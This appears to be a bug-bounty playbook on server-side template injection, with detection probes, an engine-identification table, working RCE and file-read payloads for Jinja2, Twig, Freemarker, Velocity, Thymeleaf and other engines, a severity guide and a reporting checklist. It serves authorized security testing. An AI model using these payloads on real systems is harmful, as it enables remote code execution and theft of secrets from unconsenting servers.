# SSTI — Server-Side Template Injection Playbook

> 1. Compressed from PortSwigger Web Security Academy extract (`portswigger-ssti.md`) + public engine-gadget research. Bug-bounty reference — authorized targets only.

## 2. Quick Detection

**Root cause:** input concatenated into template string, not passed as data.
Vulnerable: `$twig->render("Dear " . $_GET['name'])` — Safe: `$twig->render("Dear {first_name}", $data)`.

**Fuzz first:** inject `${{<%[%'"}}%\` → error/exception = engine parses input.
**Polyglot math probe:** `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}*{7*7}` — any `49` in response = SSTI confirmed.

**Plaintext vs code context:**
- Plaintext (input rendered as-is): `?username=${7*7}` → `Hello 49` = SSTI.
- Code (input lands inside existing `{{...}}`): `?greeting=data.username<tag>` → blank/error (no plain XSS); then breakout `?greeting=data.username}}<tag>` → HTML rendered = SSTI.

**Differentiate:** XSS renders client-side only; SSTI evaluates server-side (math=49) and often escalates to RCE/arbitrary file read; code injection = arbitrary language exec, SSTI = template syntax (usually escapable to full RCE).

**Engine ID decision tree** (probe1 → probe2; never conclude from one hit — `{{7*'7'}}` = 49 in Twig, 7777777 in Jinja2):

| Probe 1 | Eval? | Probe 2 | Outcome → Engine |
|---|---|---|---|
| `{{7*7}}` | 49 | `{{7*'7'}}` | `49`→Twig · `7777777`→Jinja2 |
| `${7*7}` | 49 | `${7*'7'}` | `49`→Smarty · error→Freemarker |
| `<%= 7*7 %>` | 49 | — | ERB (invalid `<%=foobar%>` leaks stack trace naming engine+version) |
| `#{7*7}` | 49 | — | Ruby (Slim/ERB family) |
| `*{7*7}` / `[[${7*7}]]` | 49 | — | Thymeleaf inline |
| nothing evals, `{{7*7}}` echoed | — | — | logic-less (Handlebars/Mustache) → low risk |

## 3. Attack Vectors / Exploitation

**Method:** read engine docs → learn basic syntax → check security docs → enumerate exposed objects → build object chain.

**Jinja2 (Flask):**
- Recon: `{{config}}` (SECRET_KEY) · `{{config.items()}}` · `{{request.environ}}`.
- MRO gadget: `{{''.__class__.__mro__[1].__subclasses__()}}` → find `subprocess.Popen` index N → call it with `('id',shell=True,stdout=-1).communicate()`.
- Globals chain: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
- Flask shorts: `{{lipsum.__globals__.os.popen('id').read()}}` · `{{cycler.__init__.__globals__.os.popen('id').read()}}` · `{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`.

**Twig:**
- Map/filter tricks (Twig 3): `{{['id']|map('system')}}` · `{{['id']|filter('system')}}` · `{{[0]|reduce('system','id')}}` · `{{['id']|sort('system')}}`.
- Legacy (<3): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.
- File read: `{{source('/etc/passwd')}}` · `{{'/etc/passwd'|file_excerpt(1,30)}}`.

Other engines: see payload table below.

## 4. Payload Table (RCE gadgets per engine)

| Engine | Gadget |
|---|---|
| Jinja2 | `{{lipsum.__globals__.os.popen('id').read()}}` |
| Twig | `{{['id']\|map('system')}}` / `registerUndefinedFilterCallback("exec")` |
| ERB | `<%= system('id') %>` · `<%= File.open('/etc/passwd').read %>` |
| Mako | `${__import__('os').popen('id').read()}` (direct Python) |
| Freemarker | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| Velocity | `#set($s="")#set($r=$s.class.forName("java.lang.Runtime").getRuntime().exec("id"))$r.waitFor()` (+ read stream) |
| Smarty | `{system('id')}` (security off) · `{self::getStreamVariable("file:///etc/passwd")}` |
| Thymeleaf | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` (fragment injection) |
| Pebble | `{% set c='id' %}{% set p=c.getClass().forName('java.lang.Runtime').getRuntime().exec(c) %}` |
| Handlebars | sandbox-escape gadget chain (`lookup`/`push`) → RCE; logic-less — check eval helpers first |

## 5. By-Design Filters (SKIP)

Sites may let content editors author templates **by design** — intended functionality, not a vuln unless attacker-reachable (low-priv role / account takeover). Engine sandbox/security-filter bypass details: out of scope here.

## 6. Severity Guide

| Scenario | Severity |
|---|---|
| Unauth SSTI → proven RCE | Critical |
| SSTI → file read / secrets (SECRET_KEY, creds) | High |
| SSTI → SSRF / internal recon only | Medium–High |
| Math eval only, no sensitive object access | Low–Medium |
| Editor-role (by-design) SSTI → RCE | Medium — verify scope |
| Client-side template injection | per XSS policy |

## 7. Reporting Checklist

- [ ] Engine + version identified (probe evidence attached)
- [ ] Eval proof: `7*7` → `49`
- [ ] Full chain reproduced, non-destructive (`id`/`whoami` only)
- [ ] Secrets redacted; no persistence, no lateral movement
- [ ] Affected parameter(s) + request/response included
- [ ] Impact statement matches proven capability, not theory
- [ ] By-design template editing noted if applicable

> ⚠️ Blocked/unproven exploit chain = INFORMATIONAL per master KB rule. Never claim HIGH/CRIT from theory alone.
